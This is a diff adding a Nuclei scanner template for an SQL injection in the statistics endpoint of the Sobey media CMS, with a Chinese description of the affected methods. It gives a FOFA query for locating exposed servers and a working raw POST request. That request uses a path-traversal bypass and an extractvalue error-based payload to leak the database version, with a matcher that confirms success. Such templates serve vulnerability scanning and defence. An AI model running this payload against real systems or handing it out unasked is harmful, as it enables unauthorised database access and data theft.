@@ -1,0 +1,25 @@
+id: sobey-cms-statistics-multiple-sqli
+
+info:
+  name: "索贝融媒体系统 statistics 接口多方法 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="SOBEY-融媒体"
+        索贝融媒体系统的 /sobey-mchEditor/mch/statistics 接口包含 wxarticleList、wxarticleTotalList、countWxarticleByChannel、articleList、articleListTotal、articleListId、articlePaymentList、countArticleByUser、queryArgList、countArticleBysubColumn、countArticleByBaobiaoUser、getCustomFieldByCodes 等多个方法，其参数输入未进行有效验证，存在可被利用的SQL注入缺陷。攻击者可通过向该接口的多个参数注入恶意输入，触发SQL注入漏洞，从而执行任意SQL代码，导致数据库敏感信息泄露、数据完整性破坏及系统权限被篡夺。该漏洞影响数据库的机密性、完整性和可用性，极端情况下可能引发系统级权限沦陷。
+  tags: 索贝内容管理系统
+
+http:
+- raw:
+  - |
+    POST /sobey-mchEditor/mch/statistics/js/../wxarticleList HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    createUserCode=1'+and+extractvalue(1,concat(0x7e,@@version))+and '1'='1&token=1&siteCode=1
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'XPATH'
